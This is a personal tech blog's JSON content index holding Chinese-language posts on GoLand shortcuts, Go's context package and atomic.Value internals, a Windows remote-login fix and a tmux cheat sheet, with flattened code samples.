{"pages":[{"title":"标签","date":"2019-02-08T03:59:43.233Z","updated":"2019-02-06T13:41:04.416Z","comments":false,"path":"aboutme/index.html","permalink":"https://dreamerjonson.com/aboutme/index.html","excerpt":"","text":""},{"title":"比特币外文资源荟萃","date":"2018-12-03T02:09:56.283Z","updated":"2018-12-03T02:09:56.283Z","comments":false,"path":"bitcoin/index.html","permalink":"https://dreamerjonson.com/bitcoin/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-11-04T16:55:54.345Z","updated":"2018-11-04T16:55:54.345Z","comments":false,"path":"categories/index.html","permalink":"https://dreamerjonson.com/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-11-13T15:32:53.109Z","updated":"2018-11-13T15:32:53.109Z","comments":false,"path":"links/index.html","permalink":"https://dreamerjonson.com/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-11-04T16:56:25.053Z","updated":"2018-11-04T16:56:25.053Z","comments":false,"path":"tags/index.html","permalink":"https://dreamerjonson.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"golang[74]-goland-技巧","slug":"golang-74-goland-tips","date":"2019-05-11T01:59:34.000Z","updated":"2019-05-11T03:26:02.134Z","comments":true,"path":"2019/05/11/golang-74-goland-tips/","link":"","permalink":"https://dreamerjonson.com/2019/05/11/golang-74-goland-tips/","excerpt":"","text":"Implement Interface Implement Interface is a hidden gem that can be found by using the common Intellij keystroke combo ⌥ (Option/Alt) + Enter on the struct that you wish to implement the interface. This will open a search window, and you can type the interface that you wish to implement. Extract Interface I wish this had a great keyboard combination, but it doesn’t currently by default. If you wish to extract an interface, then you need to Right-Click on struct → Refactor → Extract → Interface. Once the menu pops up it asks you more information, name, file to add to, package…etc. I still use this quite often. you can consider Ctrl+T 6 (Refactor this) as a shortcut for Extract interface Live Templates Live templates are awesome for quickly generating some code that you commonly use. In general, you type in a few characters and then hit tab. Some built in live templates are forr which generates a for range loop (you need the extra “r”) and err which allow you to handle errors quickly. These are really powerful because you can also create your own live templates. For example, if you have a common logging framework when you logged “info” you could create logi as your own template which would generate your “log.info” statement. If you have a hard time remembering these, just remember one keyboard combo: ⌘ (Command) + j — this will show you all available templates within the context of the block of code where your cursor is at. Enjoy these examples below: forr — for range loop To execute this live template, just type “forr” + tab 3b. err — check for error and handle To execute this live template, just type “err” + tab Fill Struct I am not exactly sure when this was released, but it is glorious. If are familiar constructors in Java or C#, then you were used to a little IDE help when you instantiated a new class. This gives you that same power (albeit a little more clunky). In this case, if you have a struct that you are creating, then if you put your cursor between the brackets {}, then hit ⌥ (Option/Alt) + Enter, it will give you the option of “Fill Struct” or “Fill Struct Recursively”. Choose one. Save your typing for some other fun code, and let this thing do its work! Generate test cases/test file This is probably my favorite. I am pretty passionate about writing testable code and unit testing in general. I really think that writing testable code using SOLID principles will help you design better and more maintainable code. I found this nugget pretty early in my golang learnings, but it is definitely my most used feature. If you put your cursor on a method, type ⌘ (Command) + n , and this will bring up the “Generate” menu, and from here you can select “Test for function” or “Test for file” and if the _test.go file doesn’t exist, it will create it for you along with the outline of parameterized/table tests for your functions. Pretty awesome. Refactorings Refactorings is another fundamental need one may have when making changes to a program. With GoLand, you can extract a function from an expression at the caret, or from a group of selected statements, by using the dedicated Extract action (Alt+Ctrl+M for Windows/Linux and Alt+Cmd+M for macOS), or selecting the Method option in the generic Refactor This popup (Ctrl+T): The same refactoring is available for variables (Alt+Ctrl+V for Windows/Linux and Alt+Cmd+V for macOS) and constants (Alt+Ctrl+V for Windows/Linux and Alt+Cmd+V for macOS). You can inline a constant, or variable at the caret by using the dedicated Extract action (Alt+Ctrl+M for Windows/Linux and Alt+Cmd+M for macOS), or select the Inline option in the generic Refactor This popup (Ctrl+T). The IDE will update all references to the symbol and replace them with the value: Navigation One thing that you do more often than write code is read code. GoLand helps here as well. For example, the IDE lets you instantly navigate to an interface implemented by the type at the caret with one click: either by clicking the icon on the left side of the editor, using the dedicated Show Interfaces (Ctrl+U for Windows/Linux and Cmd+U for macOS) action, or by using the corresponding intention action: A similar icon, dedicated action (Show Implementations via Ctrl+B for Windows/Linux and Cmd+B for macOS) and intention action can navigate you to types that implement the interface at the caret. Every time you see a popup with a list of symbols, be it usages, implementations, implemented interfaces or completion suggestions, you can call Quick Definition (Ctrl+Shift+I for Windows/Linux or Cmd+Y for macOS) or Quick Documentation (Ctrl+Q for Windows/Linux and Ctrl+J for macOS) to have another popup open aside it with the definition or documentation for the selected symbol: Navigate back/forward ⌘[ ⌘] Expand or collapse a code block in the editor ⌘+ ⌘- shift Show implementation ⌥⌘B ⌘B Quick definition ⌥Space Search everywhere Double Shift importtant ⌘E Navigate to type hierarchy ⌃H 参考 https://medium.com/@andrey_cheptsov/golands-take-on-go-development-7d2611b14b99 https://www.jetbrains.com/help/go/discover-goland.html","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[73]-context详解","slug":"golang-73-context","date":"2019-05-09T09:12:56.000Z","updated":"2019-05-11T03:25:56.205Z","comments":true,"path":"2019/05/09/golang-73-context/","link":"","permalink":"https://dreamerjonson.com/2019/05/09/golang-73-context/","excerpt":"","text":"背景 golang在1.6.2的时候还没有自己的context，在1.7的版本中就把golang.org/x/net/context包被加入到了官方的库中。golang 的 Context包，是专门用来简化对于处理单个请求的多个goroutine之间与请求域的数据、取消信号、截止时间等相关操作，这些操作可能涉及多个 API 调用。 比如有一个网络请求Request，每个Request都需要开启一个goroutine做一些事情，这些goroutine又可能会开启其他的goroutine。这样的话， 我们就可以通过Context，来跟踪这些goroutine，并且通过Context来控制他们的目的，这就是Go语言为我们提供的Context，中文可以称之为“上下文”。 另外一个实际例子是，在Go服务器程序中，每个请求都会有一个goroutine去处理。然而，处理程序往往还需要创建额外的goroutine去访问后端资源，比如数据库、RPC服务等。由于这些goroutine都是在处理同一个请求，所以它们往往需要访问一些共享的资源，比如用户身份信息、认证token、请求截止时间等。而且如果请求超时或者被取消后，所有的goroutine都应该马上退出并且释放相关的资源。这种情况也需要用Context来为我们取消掉所有goroutine 如果要使用可以通过 go get golang.org/x/net/context 命令获取这个包。 Context 定义 ontext的主要数据结构是一种嵌套的结构或者说是单向的继承关系的结构，比如最初的context是一个小盒子，里面装了一些数据，之后从这个context继承下来的children就像在原本的context中又套上了一个盒子，然后里面装着一些自己的数据。或者说context是一种分层的结构，根据使用场景的不同，每一层context都具备有一些不同的特性，这种层级式的组织也使得context易于扩展，职责清晰。 context 包的核心是 struct Context，声明如下： 1234567891011type Context interface &#123;Deadline() (deadline time.Time, ok bool)Done() &lt;-chan struct&#123;&#125;Err() errorValue(key interface&#123;&#125;) interface&#123;&#125;&#125; 可以看到Context是一个interface，在golang里面，interface是一个使用非常广泛的结构，它可以接纳任何类型。Context定义很简单，一共4个方法，我们需要能够很好的理解这几个方法 Deadline方法是获取设置的截止时间的意思，第一个返回式是截止时间，到了这个时间点，Context会自动发起取消请求；第二个返回值ok==false时表示没有设置截止时间，如果需要取消的话，需要调用取消函数进行取消。 Done方法返回一个只读的chan，类型为struct{}，我们在goroutine中，如果该方法返回的chan可以读取，则意味着parent context已经发起了取消请求，我们通过Done方法收到这个信号后，就应该做清理操作，然后退出goroutine，释放资源。之后，Err 方法会返回一个错误，告知为什么 Context 被取消。 Err方法返回取消的错误原因，因为什么Context被取消。 Value方法获取该Context上绑定的值，是一个键值对，所以要通过一个Key才可以获取对应的值，这个值一般是线程安全的。 Context 的实现方法 Context 虽然是个接口，但是并不需要使用方实现，golang内置的context 包，已经帮我们实现了2个方法，一般在代码中，开始上下文的时候都是以这两个作为最顶层的parent context，然后再衍生出子context。这些 Context 对象形成一棵树：当一个 Context 对象被取消时，继承自它的所有 Context 都会被取消。两个实现如下： 12345678910111213141516var ( background = new(emptyCtx) todo = new(emptyCtx))func Background() Context &#123; return background&#125;func TODO() Context &#123; return todo&#125; 一个是Background，主要用于main函数、初始化以及测试代码中，作为Context这个树结构的最顶层的Context，也就是根Context，它不能被取消。 一个是TODO，如果我们不知道该使用什么Context的时候，可以使用这个，但是实际应用中，暂时还没有使用过这个TODO。 他们两个本质上都是emptyCtx结构体类型，是一个不可取消，没有设置截止时间，没有携带任何值的Context。 123456789101112131415161718192021type emptyCtx intfunc (*emptyCtx) Deadline() (deadline time.Time, ok bool) &#123; return&#125;func (*emptyCtx) Done() &lt;-chan struct&#123;&#125; &#123; return nil&#125;func (*emptyCtx) Err() error &#123; return nil&#125;func (*emptyCtx) Value(key interface&#123;&#125;) interface&#123;&#125; &#123; return nil&#125; Context 的 继承 有了如上的根Context，那么是如何衍生更多的子Context的呢？这就要靠context包为我们提供的With系列的函数了。 1234567func WithCancel(parent Context) (ctx Context, cancel CancelFunc)func WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)func WithValue(parent Context, key, val interface&#123;&#125;) Context 通过这些函数，就创建了一颗Context树，树的每个节点都可以有任意多个子节点，节点层级可以有任意多个。 WithCancel函数，传递一个父Context作为参数，返回子Context，以及一个取消函数用来取消Context。 WithDeadline函数，和WithCancel差不多，它会多传递一个截止时间参数，意味着到了这个时间点，会自动取消Context，当然我们也可以不等到这个时候，可以提前通过取消函数进行取消。 WithTimeout和WithDeadline基本上一样，这个表示是超时自动取消，是多少时间后自动取消Context的意思。 WithValue函数和取消Context无关，它是为了生成一个绑定了一个键值对数据的Context，这个绑定的数据可以通过Context.Value方法访问到，这是我们实际用经常要用到的技巧，一般我们想要通过上下文来传递数据时，可以通过这个方法，如我们需要tarce追踪系统调用栈的时候。 With 系列函数详解 WithCancel context.WithCancel生成了一个withCancel的实例以及一个cancelFuc，这个函数就是用来关闭ctxWithCancel中的 Done channel 函数。 下面来分析下源码实现，首先看看初始化，如下： 123456789101112func newCancelCtx(parent Context) cancelCtx &#123; return cancelCtx&#123; Context: parent, done: make(chan struct&#123;&#125;), &#125;&#125;func WithCancel(parent Context) (ctx Context, cancel CancelFunc) &#123; c := newCancelCtx(parent) propagateCancel(parent, &amp;c) return &amp;c, func() &#123; c.cancel(true, Canceled) &#125;&#125; newCancelCtx返回一个初始化的cancelCtx，cancelCtx结构体继承了Context，实现了canceler方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455//*cancelCtx 和 *timerCtx 都实现了canceler接口，实现该接口的类型都可以被直接canceledtype canceler interface &#123; cancel(removeFromParent bool, err error) Done() &lt;-chan struct&#123;&#125;&#125;type cancelCtx struct &#123; Context done chan struct&#123;&#125; // closed by the first cancel call. mu sync.Mutex children map[canceler]bool // set to nil by the first cancel call err error // 当其被cancel时将会把err设置为非nil&#125;func (c *cancelCtx) Done() &lt;-chan struct&#123;&#125; &#123; return c.done&#125;func (c *cancelCtx) Err() error &#123; c.mu.Lock() defer c.mu.Unlock() return c.err&#125;func (c *cancelCtx) String() string &#123; return fmt.Sprintf(\"%v.WithCancel\", c.Context)&#125;//核心是关闭c.done//同时会设置c.err = err, c.children = nil//依次遍历c.children，每个child分别cancel//如果设置了removeFromParent，则将c从其parent的children中删除func (c *cancelCtx) cancel(removeFromParent bool, err error) &#123; if err == nil &#123; panic(\"context: internal error: missing cancel error\") &#125; c.mu.Lock() if c.err != nil &#123; c.mu.Unlock() return // already canceled &#125; c.err = err close(c.done) for child := range c.children &#123; // NOTE: acquiring the child's lock while holding parent's lock. child.cancel(false, err) &#125; c.children = nil c.mu.Unlock() if removeFromParent &#123; removeChild(c.Context, c) // 从此处可以看到 cancelCtx的Context项是一个类似于parent的概念 &#125;&#125; 可以看到，所有的children都存在一个map中；Done方法会返回其中的done channel， 而另外的cancel方法会关闭Done channel并且逐层向下遍历，关闭children的channel，并且将当前canceler从parent中移除。 WithCancel初始化一个cancelCtx的同时，还执行了propagateCancel方法，最后返回一个cancel function。 propagateCancel 方法定义如下： 123456789101112131415161718192021222324252627// propagateCancel arranges for child to be canceled when parent is.func propagateCancel(parent Context, child canceler) &#123; if parent.Done() == nil &#123; return // parent is never canceled &#125; if p, ok := parentCancelCtx(parent); ok &#123; p.mu.Lock() if p.err != nil &#123; // parent has already been canceled child.cancel(false, p.err) &#125; else &#123; if p.children == nil &#123; p.children = make(map[canceler]struct&#123;&#125;) &#125; p.children[child] = struct&#123;&#125;&#123;&#125; &#125; p.mu.Unlock() &#125; else &#123; go func() &#123; select &#123; case &lt;-parent.Done(): child.cancel(false, parent.Err()) case &lt;-child.Done(): &#125; &#125;() &#125;&#125; propagateCancel 的含义就是传递cancel，从当前传入的parent开始（包括该parent），向上查找最近的一个可以被cancel的parent， 如果找到的parent已经被cancel，则将方才传入的child树给cancel掉，否则，将child节点直接连接为找到的parent的children中（Context字段不变，即向上的父亲指针不变，但是向下的孩子指针变直接了）； 如果没有找到最近的可以被cancel的parent，即其上都不可被cancel，则启动一个goroutine等待传入的parent终止，则cancel传入的child树，或者等待传入的child终结。 WithDeadLine 在withCancel的基础上进行的扩展，如果时间到了之后就进行cancel的操作，具体的操作流程基本上与withCancel一致，只不过控制cancel函数调用的时机是有一个timeout的channel所控制的。 Context 使用原则 和 技巧 不要把Context放在结构体中，要以参数的方式传递，parent Context一般为Background 应该要把Context作为第一个参数传递给入口请求和出口请求链路上的每一个函数，放在第一位，变量名建议都统一，如ctx。 给一个函数方法传递Context的时候，不要传递nil，否则在tarce追踪的时候，就会断了连接 Context的Value相关方法应该传递必须的数据，不要什么数据都使用这个传递 Context是线程安全的，可以放心的在多个goroutine中传递 可以把一个 Context 对象传递给任意个数的 gorotuine，对它执行 取消 操作时，所有 goroutine 都会接收到取消信号。 Context的常用方法实例 调用Context Done方法取消 12345678910111213141516func Stream(ctx context.Context, out chan&lt;- Value) error &#123; for &#123; v, err := DoSomething(ctx) if err != nil &#123; return err &#125; select &#123; case &lt;-ctx.Done(): return ctx.Err() case out &lt;- v: &#125; &#125;&#125; 2、通过 context.WithValue 来传值 12345678910111213141516171819202122232425262728func main() &#123; ctx, cancel := context.WithCancel(context.Background()) valueCtx := context.WithValue(ctx, key, \"add value\") go watch(valueCtx) time.Sleep(10 * time.Second) cancel() time.Sleep(5 * time.Second)&#125;func watch(ctx context.Context) &#123; for &#123; select &#123; case &lt;-ctx.Done(): //get value fmt.Println(ctx.Value(key), \"is cancel\") return default: //get value fmt.Println(ctx.Value(key), \"int goroutine\") time.Sleep(2 * time.Second) &#125; &#125;&#125; 3、超时取消 context.WithTimeout 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( \"fmt\" \"sync\" \"time\" \"golang.org/x/net/context\")var ( wg sync.WaitGroup)func work(ctx context.Context) error &#123; defer wg.Done() for i := 0; i &lt; 1000; i++ &#123; select &#123; case &lt;-time.After(2 * time.Second): fmt.Println(\"Doing some work \", i) // we received the signal of cancelation in this channel case &lt;-ctx.Done(): fmt.Println(\"Cancel the context \", i) return ctx.Err() &#125; &#125; return nil&#125;func main() &#123; ctx, cancel := context.WithTimeout(context.Background(), 4*time.Second) defer cancel() fmt.Println(\"Hey, I'm going to do some work\") wg.Add(1) go work(ctx) wg.Wait() fmt.Println(\"Finished. I'm going home\")&#125; 4、截止时间 取消 context.WithDeadline 123456789101112131415161718192021222324package mainimport ( \"context\" \"fmt\" \"time\")func main() &#123; d := time.Now().Add(1 * time.Second) ctx, cancel := context.WithDeadline(context.Background(), d) // Even though ctx will be expired, it is good practice to call its // cancelation function in any case. Failure to do so may keep the // context and its parent alive longer than necessary. defer cancel() select &#123; case &lt;-time.After(2 * time.Second): fmt.Println(\"oversleep\") case &lt;-ctx.Done(): fmt.Println(ctx.Err()) &#125;&#125; 5、 12345678910111213141516171819202122232425func main() &#123; ctx, cancel := context.WithCancel(context.Background()) go watch(ctx,&quot;【监控1】&quot;) go watch(ctx,&quot;【监控2】&quot;) go watch(ctx,&quot;【监控3】&quot;) time.Sleep(10 * time.Second) fmt.Println(&quot;可以了，通知监控停止&quot;) cancel() //为了检测监控过是否停止，如果没有监控输出，就表示停止了 time.Sleep(5 * time.Second)&#125;func watch(ctx context.Context, name string) &#123; for &#123; select &#123; case &lt;-ctx.Done(): fmt.Println(name,&quot;监控退出，停止了...&quot;) return default: fmt.Println(name,&quot;goroutine监控中...&quot;) time.Sleep(2 * time.Second) &#125; &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[72]-理解Go标准库中的atomic.Value类型","slug":"golang-72-atomic-Value","date":"2019-05-09T05:49:43.000Z","updated":"2019-05-09T06:12:12.482Z","comments":true,"path":"2019/05/09/golang-72-atomic-Value/","link":"","permalink":"https://dreamerjonson.com/2019/05/09/golang-72-atomic-Value/","excerpt":"","text":"前言 在 Go 语言标准库中, sync/atomic包将底层硬件提供的原子操作封装成了 Go 的函数。但这些操作只支持几种基本数据类型，因此为了扩大原子操作的适用范围，Go 语言在 1.4 版本的时候向sync/atomic包中添加了一个新的类型Value。此类型的值相当于一个容器，可以被用来“原子地”存储（Store）和加载（Load）任意类型的值。 历史起源 我在golang-dev邮件列表中翻到了14年的这段讨论，有人报告了encoding/gob包在多核机器上（80-core）上的性能问题，认为encoding/gob之所以不能完全利用到多核的特性是因为它里面使用了大量的互斥锁（mutex），如果把这些互斥锁换成用atomic.LoadPointer/StorePointer来做并发控制，那性能将能提升20倍。 针对这个问题，有人提议在已有的atomic包的基础上封装出一个atomic.Value类型，这样用户就可以在不依赖 Go 内部类型unsafe.Pointer的情况下使用到atomic提供的原子操作。所以我们现在看到的atomic包中除了atomic.Value外，其余都是早期由汇编写成的，并且atomic.Value类型的底层实现也是建立在已有的atomic包的基础上。 那为什么在上面的场景中，atomic会比mutex性能好很多呢？作者 Dmitry Vyukov 总结了这两者的一个区别： Mutexes do no scale. Atomic loads do. Mutex由操作系统实现，而atomic包中的原子操作则由底层硬件直接提供支持。在 CPU 实现的指令集里，有一些指令被封装进了atomic包，这些指令在执行的过程中是不允许中断（interrupt）的，因此原子操作可以在lock-free的情况下保证并发安全，并且它的性能也能做到随 CPU 个数的增多而线性扩展。 好了，说了这么多的原子操作，我们先来看看什么样的操作能被叫做原子操作 。 一个或者多个操作在 CPU 执行的过程中不被中断的特性，称为原子性（atomicity） 。这些操作对外表现成一个不可分割的整体，他们要么都执行，要么都不执行，外界不会看到他们只执行到一半的状态。而在现实世界中，CPU 不可能不中断的执行一系列操作，但如果我们在执行多个操作时，能让他们的中间状态对外不可见，那我们就可以宣称他们拥有了”不可分割”的原子性。 有些朋友可能不知道，在 Go（甚至是大部分语言）中，一条普通的赋值语句其实不是一个原子操作。例如，在32位机器上写int64类型的变量有中间状态，它会被拆成两次写操作（MOV）——写低 32 位和写高 32 位，如下图所示： 如果一个线程刚写完低32位，还没来得及写高32位时，另一个线程读取了这个变量，那它得到的就是一个毫无逻辑的中间变量，这很有可能使我们的程序出现诡异的 Bug。 这还只是一个基础类型，如果我们对一个结构体进行赋值，那它出现并发问题的概率就更高了。很可能写线程刚写完一小半的字段，读线程就来读取这个变量，那么就只能读到仅修改了一部分的值。这显然破坏了变量的完整性，读出来的值也是完全错误的。 面对这种多线程下变量的读写问题，我们的主角——atomic.Value登场了，它使得我们可以不依赖于不保证兼容性的unsafe.Pointer类型，同时又能将任意数据类型的读写操作封装成原子性操作（让中间状态对外不可见）。 使用姿势 atomic.Value类型对外暴露的方法就两个： v.Store© - 写操作，将原始的变量c存放到一个atomic.Value类型的v里。 c = v.Load() - 读操作，从线程安全的v中读取上一步存放的内容。 简洁的接口使得它的使用也很简单，只需将需要作并发保护的变量读取和赋值操作用Load()和Store()代替就行了。 下面是一个常见的使用场景。应用程序定期的从外界获取最新的配置信息，然后更改自己内存中维护的配置变量。工作线程根据最新的配置来处理请求。 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( \"sync/atomic\" \"time\")func loadConfig() map[string]string &#123; // 从数据库或者文件系统中读取配置信息，然后以map的形式存放在内存里 return make(map[string]string)&#125;func requests() chan int &#123; // 将从外界中接受到的请求放入到channel里 return make(chan int)&#125;func main() &#123; // config变量用来存放该服务的配置信息 var config atomic.Value // 初始化时从别的地方加载配置文件，并存到config变量里 config.Store(loadConfig()) go func() &#123; // 每10秒钟定时的拉取最新的配置信息，并且更新到config变量里 for &#123; time.Sleep(10 * time.Second) // 对应于赋值操作 config = loadConfig() config.Store(loadConfig()) &#125; &#125;() // 创建工作线程，每个工作线程都会根据它所读取到的最新的配置信息来处理请求 for i := 0; i &lt; 10; i++ &#123; go func() &#123; for r := range requests() &#123; // 对应于取值操作 c := config // 由于Load()返回的是一个interface&#123;&#125;类型，所以我们要先强制转换一下 c := config.Load().(map[string]string) // 这里是根据配置信息处理请求的逻辑... _, _ = r, c &#125; &#125;() &#125;&#125; 数据结构 atomic.Value被设计用来存储任意类型的数据，所以它内部的字段是一个interface{}类型，非常的简单粗暴。 123 type Value struct &#123; v interface&#123;&#125;&#125; 除了Value外，这个文件里还定义了一个ifaceWords类型，这其实是一个空interface (interface{}）的内部表示格式（参见runtime/runtime2.go中eface的定义）。它的作用是将interface{}类型分解，得到其中的两个字段。 1234type ifaceWords struct &#123; typ unsafe.Pointer data unsafe.Pointer&#125; 写入（Store）操作 在介绍写入之前，我们先来看一下 Go 语言内部的unsafe.Pointer类型。 unsafe.Pointer 出于安全考虑，Go 语言并不支持直接操作内存，但它的标准库中又提供一种不安全（不保证向后兼容性） 的指针类型unsafe.Pointer，让程序可以灵活的读取/操作内存。 unsafe.Pointer的特别之处在于，它可以绕过 Go 语言类型系统的检查，与任意的指针类型互相转换。也就是说，如果两种类型具有相同的内存结构，我们可以将unsafe.Pointer当做桥梁，让这两种类型的指针相互转换，从而实现同一份内存拥有两种不同的解读方式。 比如说，[]byte和string其实内部的存储结构都是一样的，但 Go 语言的类型系统禁止他俩互换。如果借助unsafe.Pointer，我们就可以实现在零拷贝的情况下，将[]byte数组直接转换成string类型。 12345bytes := []byte&#123;104, 101, 108, 108, 111&#125;p := unsafe.Pointer(&amp;bytes) //强制转换成unsafe.Pointer，编译器不会报错str := *(*string)(p) //然后强制转换成string类型的指针，再将这个指针的值当做string类型取出来fmt.Println(str) //输出 \"hello\" 知道了unsafe.Pointer的作用，我们可以直接来看代码了： 1234567891011121314151617181920212223242526272829303132333435363738func (v *Value) Store(x interface&#123;&#125;) &#123; if x == nil &#123; panic(\"sync/atomic: store of nil value into Value\") &#125; vp := (*ifaceWords)(unsafe.Pointer(v)) // Old value xp := (*ifaceWords)(unsafe.Pointer(&amp;x)) // New value for &#123; typ := LoadPointer(&amp;vp.typ) if typ == nil &#123; // Attempt to start first store. // Disable preemption so that other goroutines can use // active spin wait to wait for completion; and so that // GC does not see the fake type accidentally. runtime_procPin() if !CompareAndSwapPointer(&amp;vp.typ, nil, unsafe.Pointer(^uintptr(0))) &#123; runtime_procUnpin() continue &#125; // Complete first store. StorePointer(&amp;vp.data, xp.data) StorePointer(&amp;vp.typ, xp.typ) runtime_procUnpin() return &#125; if uintptr(typ) == ^uintptr(0) &#123; // First store in progress. Wait. // Since we disable preemption around the first store, // we can wait with active spinning. continue &#125; // First store completed. Check type and overwrite data. if typ != xp.typ &#123; panic(\"sync/atomic: store of inconsistently typed value into Value\") &#125; StorePointer(&amp;vp.data, xp.data) return &#125;&#125; 大概的逻辑： 第5~6行 - 通过unsafe.Pointer将现有的和要写入的值分别转成ifaceWords类型，这样我们下一步就可以得到这两个interface{}的原始类型（typ）和真正的值（data）。 从第7行开始就是一个无限 for 循环。配合CompareAndSwap食用，可以达到乐观锁的功效。 第8行，我们可以通过LoadPointer这个原子操作拿到当前Value中存储的类型。下面根据这个类型的不同，分3种情况处理。 第一次写入（第9~24行） - 一个Value实例被初始化后，它的typ字段会被设置为指针的零值 nil，所以第9行先判断如果typ是 nil 那就证明这个Value还未被写入过数据。那之后就是一段初始写入的操作： runtime_procPin()这是runtime中的一段函数，具体的功能我不是特别清楚，也没有找到相关的文档。这里猜测一下，一方面它禁止了调度器对当前 goroutine 的抢占（preemption），使得它在执行当前逻辑的时候不被打断，以便可以尽快地完成工作，因为别人一直在等待它。另一方面，在禁止抢占期间，GC 线程也无法被启用，这样可以防止 GC 线程看到一个莫名其妙的指向^uintptr(0)的类型（这是赋值过程中的中间状态）。 使用CAS操作，先尝试将typ设置为^uintptr(0)这个中间状态。如果失败，则证明已经有别的线程抢先完成了赋值操作，那它就解除抢占锁，然后重新回到 for 循环第一步。 如果设置成功，那证明当前线程抢到了这个”乐观锁”，它可以安全的把v设为传入的新值了（19~23行）。注意，这里是先写data字段，然后再写typ字段。因为我们是以typ字段的值作为写入完成与否的判断依据的。 第一次写入还未完成（第25~30行）- 如果看到typ字段还是^uintptr(0)这个中间类型，证明刚刚的第一次写入还没有完成，所以它会继续循环，”忙等”到第一次写入完成。 第一次写入已完成（第31行及之后） - 首先检查上一次写入的类型与这一次要写入的类型是否一致，如果不一致则抛出异常。反之，则直接把这一次要写入的值写入到data字段。 读取（Load）操作 12345678910111213func (v *Value) Load() (x interface&#123;&#125;) &#123; vp := (*ifaceWords)(unsafe.Pointer(v)) typ := LoadPointer(&amp;vp.typ) if typ == nil || uintptr(typ) == ^uintptr(0) &#123; // First store not yet completed. return nil &#125; data := LoadPointer(&amp;vp.data) xp := (*ifaceWords)(unsafe.Pointer(&amp;x)) xp.typ = typ xp.data = data return&#125; 读取相对就简单很多了，它有两个分支： 如果当前的typ是 nil 或者^uintptr(0)，那就证明第一次写入还没有开始，或者还没完成，那就直接返回 nil （不对外暴露中间状态）。 否则，根据当前看到的typ和data构造出一个新的interface{}返回出去。 总结 本文从邮件列表中的一段讨论开始，介绍了atomic.Value的被提出来的历史缘由。然后由浅入深的介绍了它的使用姿势，以及内部实现。让大家不仅知其然，还能知其所以然。 另外，再强调一遍，原子操作由底层硬件支持，而锁则由操作系统提供的 API 实现。若实现相同的功能，前者通常会更有效率，并且更能利用计算机多核的优势。所以，以后当我们想并发安全的更新一些变量的时候，我们应该优先选择用atomic.Value来实现。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"mac远程windwos","slug":"windwos远程登陆","date":"2019-05-02T13:47:12.000Z","updated":"2019-05-02T13:48:07.413Z","comments":true,"path":"2019/05/02/windwos远程登陆/","link":"","permalink":"https://dreamerjonson.com/2019/05/02/windwos远程登陆/","excerpt":"","text":"windwos设置 windows远程登时，如果同一个用户名远程登录用户名或密码不正确，但是直接在机器上却登陆正常。 有可能是用户名错误了，有可能是密码错误。 当用户名和你的全称不一样时，就很容易出现这种情况。 解决方法： 直接在命令行输入lusrmgr.msc或者右键点击我的电脑选择管理,选择本地用户和组.右键点击你的用户名，选择修改密码。或者尝试一下使用户名与全称一致","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"mac环境配置","slug":"mac环境配置","permalink":"https://dreamerjonson.com/tags/mac环境配置/"}]},{"title":"MAC环境配置","slug":"tmux","date":"2019-04-25T05:44:19.000Z","updated":"2019-04-29T13:21:39.924Z","comments":true,"path":"2019/04/25/tmux/","link":"","permalink":"https://dreamerjonson.com/2019/04/25/tmux/","excerpt":"","text":"注意：本文内容适用于 Tmux 2.3 及以上的版本，但是绝大部分的特性低版本也都适用，鼠标支持、VI 模式、插件管理在低版本可能会与本文不兼容。 Tmux 快捷键 &amp; 速查表 启动新会话： tmux [new -s 会话名 -n 窗口名] 恢复会话： tmux at [-t 会话名] 列出所有会话： tmux ls 关闭会话： tmux kill-session -t 会话名 关闭所有会话： tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill 在 Tmux 中，按下 Tmux 前缀 ctrl+b，然后： 会话 :new&lt;回车&gt; 启动新会话 s 列出所有会话 $ 重命名当前会话 窗口 (标签页) c 创建新窗口 w 列出所有窗口 n 后一个窗口 p 前一个窗口 f 查找窗口 , 重命名当前窗口 &amp; 关闭当前窗口 调整窗口排序 swap-window -s 3 -t 1 交换 3 号和 1 号窗口 swap-window -t 1 交换当前和 1 号窗口 move-window -t 1 移动当前窗口到 1 号 窗格（分割窗口） % 垂直分割 &quot; 水平分割 o 交换窗格 x 关闭窗格 ⍽ 左边这个符号代表空格键 - 切换布局 q 显示每个窗格是第几个，当数字出现的时候按数字几就选中第几个窗格 { 与上一个窗格交换位置 } 与下一个窗格交换位置 z 切换窗格最大化/最小化 同步窗格 这么做可以切换到想要的窗口，输入 Tmux 前缀和一个冒号呼出命令提示行，然后输入： 1:setw synchronize-panes 你可以指定开或关，否则重复执行命令会在两者间切换。 这个选项值针对某个窗口有效，不会影响别的会话和窗口。 完事儿之后再次执行命令来关闭。帮助 调整窗格尺寸 如果你不喜欢默认布局，可以重调窗格的尺寸。虽然这很容易实现，但一般不需要这么干。这几个命令用来调整窗格： PREFIX : resize-pane -D 当前窗格向下扩大 1 格 PREFIX : resize-pane -U 当前窗格向上扩大 1 格 PREFIX : resize-pane -L 当前窗格向左扩大 1 格 PREFIX : resize-pane -R 当前窗格向右扩大 1 格 PREFIX : resize-pane -D 20 当前窗格向下扩大 20 格 PREFIX : resize-pane -t 2 -L 20 编号为 2 的窗格向左扩大 20 格 文本复制模式： 按下 PREFIX-[ 进入文本复制模式。可以使用方向键在屏幕中移动光标。默认情况下，方向键是启用的。在配置文件中启用 Vim 键盘布局来切换窗口、调整窗格大小。Tmux 也支持 Vi 模式。要是想启用 Vi 模式，只需要把下面这一行添加到 